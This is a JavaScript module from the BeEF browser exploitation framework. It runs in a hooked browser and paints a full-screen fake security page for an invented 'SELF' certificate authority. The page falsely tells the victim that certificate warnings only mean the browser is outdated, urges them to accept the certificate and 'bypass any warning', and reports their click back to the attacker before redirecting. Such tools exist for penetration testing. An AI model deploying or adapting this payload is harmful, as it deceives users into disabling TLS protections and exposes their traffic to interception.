/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

  getDomain = function(url){
    return url.match(/:\/\/(www\.)?(.[^/:]+)/)[2];
  }  
  
  toggleMoreInfo = function(collapse) {
    if (collapse) {
      $("more_info_long").style.display = "none";
      $("more_info_short").style.display = "block";
    } else {
      $("more_info_long").style.display = "block";
      $("more_info_short").style.display = "none";
    }
  }
  setDirectionSensitiveImages = function () {
    if (document.documentElement.dir == 'rtl') {
      $("twisty_closed_rtl").style.display = "inline";
    } else {
      $("twisty_closed").style.display = "inline";
    }
  }

  target = $j(this).attr('href');
  domain = getDomain(target);

//Assets
		warning = '<img src="data:image/png;base64,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" onmousedown="return false">';
		backgreen = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAJFCAIAAACTIQqNAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wJGA4GE+nvoKcAAAAZdEVYdENvbW1lbnQAQ3JlYXRlZCB3aXRoIEdJTVBXgQ4XAAAA4UlEQVRIx71VWxLDIAhc1iP0AD1mTy/bD2Njph1j0OaDSUTeC4jH60kAQ0QYAdChwzlMNMJVvpXn2u9AAj7nI0BmiVImCMIrzyipkdnPVd4sUZZpSp+4jzqFLxNNVbbkLmvkdPR1H4lAW3cSyATSdp9LPSpuQT8y0LT3UZxKnJK+8AlTMK8z3zXnUflWDz6an1Hyrdf4+e/avppfMxO/bYpwDMV7htulHmn3RgfDXkwtRqvmT+JkP47OwQo7/TmD25/3T1o+l0WXk/ug3YcB7Bis/8yOnelfv39/hv368nfyDcZnjfUPcK3LAAAAAElFTkSuQmCC" width="100%" height="100%" onmousedown="return false;">';
		backred = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAJFCAIAAACTIQqNAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAQRJREFUSMe9lVtyxTAIQyUW0C10v9306Qd+NNNeYyfT+8EkEwRIBpz4+vgMSYU5nyYsB+R3u4orzArRnr0OComwHRKBFO7132IOmwCFpUDJY3AdGLVzoL1nnHDIBHLGN8w8L4f4kc8ORBgPHJdab7TRi86fa39IrnrKD1I3tNniZq7kOThylgcpfNGX83aaQ2p9X+mg9VV9hza50mps6KP3cKNHF+yOzlbbQ/OKb+5vpRHyTnnF84TjqLXQjVjPbZuFCjf1b/BaYKbv9eywUYeHPDK/F5i1H1HORaVjz/8bk/+HeV9xqH3GV7z+7lGVu9qZ+szOff8Vy8b+39H5JPZuzELHNyoGruezaO1kAAAAAElFTkSuQmCC" width="100%" height="100%" onmousedown="return false;">';
		locker = '<img style="margin:16px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAAcCAIAAAD9b0jDAAAESElEQVRIia1VTWhcVRg93533ZiaTZJyEJq1t0x+lpVXqRltEhSK2FikoVN24EAvitkhc14VUhCK4ciXSCi4U+kM3RjAoWhsRqQuFaLX+BEmq/UlsTCeTefccF/e+9yZd9y7uffPe3POde75zv88k4U6PJCxX5+fe/fjopZlvbravVBIAMEAAoLDkq+KjyheShpt379j88CuHjq1prQdgkv6c+/XI8adcutBsuUbD0tTgyu1AOIyEAkpS8VYAvEe3S6fW6y9NbFq3IwHw/tk3Xfrv6LpKa8j6GuYqZtZD0ExSoC6aJAbGggQBkkhk3paX5s+cf+PIcx8mAH747YvmsLWG7K4hV60aTAaDCTJAMBSyi5BA5TMjLgQS1dRmrn8eNe36xUZ/pd5naRVmQgRDoCjJZ8y6IAXBTFaBOYNCPEHxJJUUSpYiqKsgSVBJYEE6A0xmkESPbaOHto4c2Di8W9Lvc99Oz3wyPXu62sckBRwAMEohg5xTBDWTAQZZyLqFtIpeuzePP7rzNUmSSN2/5eDOzQcnpjZ9/dPbjSaqdYMTIAa6UlAqiT6RJCPkAIMAENo+8uwjO8bnb85OTp28cPEMgD27nt6758X9e8avXL38y7VTA84lNZhWGyIeQMiFESymlJm2rHlS0uTUiVMTb11f/Pm/7NLkxeNffnfSU9vHDizeYGeJzJSzFCFKEVQ9HozBDD7T+uHdpKYunq32oTXiRsbcyJi79Pc5kls3PNRe4nJb9EQOKgZmSFAYLiopwAR5L3qRElRv2OCQDQ4bhCQzT5Fa6ShbofdWyfVj9HCuqSjKQgZlAJVlpOhJ7+WpbpfLbZNQp0h6sttRtyPfhaqIekaiBVMpXkTBKHo98+DJ/vooqWOvnqdERgOE58H+0ZefP/HR5OGVFVRqMBeIRVBXZp8qNO92ec/afeGYYSblSU8yn3dt33/rJjtt+awQFD2aKvATKXOAkGUlqfD/XqbKf7aX1GmznplVEK2Kwqelc02UGYKOt6FQ0mrQbgdZV/TBieXxkwKSAgkzyaBMJAuU2/nmtiQlmnzIc+nIpJAUAgWDIHiuZrqaIEtfIlApEEumkCCLF8Ji7ellGvkGiViCBhWpWMBWgUqgRMATgMxA3Z6oHqzcKaH05YlG/im/pqWXJEag6ZlPWY4YgMxPIH3/42dpXc717M2rec6Uysu4RMDh9IXDN+a4eEPLt+Kn6JOQBEO1rv4hS+swF1NS3PUEQF9tEFwMNzdGM9X60Bq1+gB8BgoW21EMbIBLkNZRa8gqKIpfmgxE0Ae27b187VyWWUaElueckioaTdQaYMhhtLMFLU2CmVXkHJyLFEntHNsXW/Qfs9NH33uiNrgw0ESaxkZSSJ935bInF0tZ1wBSNTc8fuirjWvuC+0X1xZmP5gY/2vhwrL/p+K0Ciff2qNbbxQAajbW3bv2sRcef2docENkijs9/ge36MK8f8CaUgAAAABJRU5ErkJggg==" alt="SSL SELF Icon" onmousedown="return false">';
		textGreen = '<b>'+domain+'</b> chose SELF&#174; to protect your security. If your browser raises any warning when continuing it means that it\'s not up-to-date. <b>Accept</b> this certificate then please consider updating your browser as soon as possible.<br><br>SELF&#174; - to make the Internet a safer place.';
		textRed =  'Your browser raised a warning because it is not up to date. As <b>'+domain+'</b> chose SELF&#174; to protect your security you need to <b>ACCEPT</b> this certificate to view its content then please consider update your browser as soon as possible. When your browser will be up to date, it will <b>accept</b> SELF&#174;-signed certificates. Please <b>bypass any warning</b> until then.<br><br>SELF&#174; - to make the Internet a safer place.';
	  arrows = '<div style="margin:0px 80px 0px"></div><div style="margin:0px 80px 0px"><form style="margin:15px 5px 15px 0px;padding:0px"><input type=button value=continue name=back onclick="forward()"></form></div><div style="margin:30px 80px 0px; border-top:1px solid #ccc; padding-top:6px" id=more_info_short><a href="#" onclick="toggleMoreInfo(false); return false" onmousedown="return false"><img id=twisty_closed src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAYAAACprHcmAAAANklEQVR42q3QMQoAMAgEwfz/05dcoVcEYQuFwWYL8Uhqb+Q9+WLDcYFxwDhgHDjev3n/z96TCxE/Ie1QsznxAAAAAElFTkSuQmCC" border=0 style=display:none><img id=twisty_closed_rtl src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAYAAACprHcmAAAAMklEQVQY02P4jwcwMDCg8vEpJEoxTCFBxcgK8SpGV4hTMTaF1DGZZDeTHBokhzOuGAQAxQt2mANh8/IAAAAASUVORK5CYII=" border=0 style=display:none><span i18n-content=moreInfoTitle style="margin-left:5px;margin-right:5px">read more about the SELF&#174; certification authority</span></a></div><div style="margin:30px 80px 0px; border-top:1px solid #ccc; padding-top:6px" id=more_info_long style=display:none><a href="#" onclick="toggleMoreInfo(true); return false" onmousedown="return false"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAYAAACprHcmAAAAMUlEQVQY02P4//8/A7GYgXaKgeA/0Riqg6BCFGcQUojhZnwKsXoQl0KcoYFNIW3DGQCkVyHtwOU6YQAAAABJRU5ErkJggg==" border=0><span style="margin-left:5px;margin-right:5px">read more about the SELF&#174; certification authority</span></a><p i18n-values=.innerHTML:moreInfo1>Security Enhanced Layer Factory&#174;: because nobody of us cannot realize the full potential of the Internet, unless it is a reliable place to interact and to deal. Our dependence on computers and the Internet increases every day, like our vulnerability. Daily news reports confirm a clear and present danger to all the Internet users (worms, viruses, trojans, malware, cybercrime, cyber-terrorism and related threats). These threats, mainly the very sophisticated group work of organized crime, directly harm millions of Internet users have real confidence in the Internet. Every individual or the company using the Internet has a role in the restoring of trust. SELF&#174; help people as customer or seller to feel safe by issuing SELF&#174;-signed certificate that are build to last. With SELF&#174; you will never be harmed again - Trust is our workship.</p><p i18n-values=.innerHTML:moreInfo2>Security Enhanced Layer Factory&#174;, SELF&#174; and SELF&#174; logo are registered trademarks.</p></div>';
	    
    buildtpl = function(target, background, icon, text, addarrows){
        tpl='<div style="position:absolute;width:100%;height:100%;">'+background+'</div><table width="100%" cellspacing=0 cellpadding=0><td style=padding:40px valign=middle align=center><div style="width:60%; background-color:white; color:black; font-size:10pt; line-height:16pt; text-align:left; padding:20px; position:relative; -webkit-box-shadow:3px 3px 8px #200; border-radius:5px"><div style=position:absolute>'+icon+'</div><div style="margin: 0px 77px 0px; font-size:18pt; line-height: 140%; margin-bottom:6pt; font-weight:bold; color:#660000">Please accept our new SELF&#174;-Signed Certificate to ensure maximum security protection.</div><div style="margin:0px 80px 0px">'+text+'</div>';
		
		if(addarrows){
		    tpl = tpl + arrows+'</div></td></table>';
    		target.innerHTML = tpl;
		    toggleMoreInfo(true);
		    setDirectionSensitiveImages();
		}else{
		    tpl = tpl + '</div></td></table>';
    		target.innerHTML = tpl;
		}
  }
  
  forward = function(){
    send("User continuing to "+target);
    timer=setTimeout(function(){timer2=setTimeout(function(){buildtpl(sneakydiv, backred, warning, textRed, true);},400);window.location = target;},500);
  }
  
  function $(o) {return document.getElementById(o);}

  sendCommand = function(cmd) {
    window.domAutomationController.setAutomationId(1);
    window.domAutomationController.send(cmd);
  }
  
  $j(document).attr('title', domain+" Security Enhanced Layer Factory&#174; certificate acceptance");
  imgbootstrap = document.createElement('div');
  imgbootstrap.setAttribute('style','display:none');
  document.body.appendChild(imgbootstrap);
  document.body.removeChild(imgbootstrap);
  buildtpl(imgbootstrap, backred, warning, textRed, false)
  sneakydiv = document.createElement('div');
  sneakydiv.setAttribute('id', 'background');
  sneakydiv.setAttribute('oncontextmenu','return false;');
  sneakydiv.setAttribute('style', 'overflow:hidden;position:absolute;width:100%;height:100%;top:0px;left:0px;z-index:51;opacity:1;background-color:#13771f; font-family:Helvetica,Arial,sans-serif; margin:0px;');
  document.body.appendChild(sneakydiv);
  buildtpl(sneakydiv, backgreen, locker, textGreen, true);
